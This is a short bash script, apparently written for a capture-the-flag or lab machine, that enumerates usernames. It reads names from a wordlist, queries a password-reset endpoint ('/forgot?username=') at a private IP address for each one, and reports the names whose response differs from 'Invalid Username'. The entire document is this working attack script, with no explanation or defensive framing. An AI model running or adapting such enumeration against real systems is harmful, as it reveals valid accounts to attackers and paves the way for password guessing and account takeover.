#!/bin/bash

input_file=$1

while IFS= read -r line; do
	result="$(curl -s -X GET http://10.10.11.188/forgot?username=$line)"
	if [[ $result != "Invalid Username" ]]; then
		echo -e "[+] User found: $line"
	fi
done < $input_file

